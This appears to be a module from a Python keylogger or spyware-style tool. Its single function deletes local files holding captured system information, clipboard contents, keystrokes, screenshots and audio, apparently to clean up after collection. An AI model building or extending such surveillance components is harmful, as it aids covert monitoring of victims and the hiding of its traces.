import os

from domain.config import Config

def cleanner(config: Config):
    _path: str = config["FILE_PATH"] + config["EXTEND"]

    _delete_files: list[str] = [
        config["SYSTEM_INFORMATION"],
        config["CLIPBOARD_INFORMATION"],
        config["KEYS_INFORMATION"],
        config["SCREENSHOT_INFORMATION"],
        config["AUDIO_INFORMATION"],
    ]

    for _file in _delete_files:
        os.remove(_path + _file)
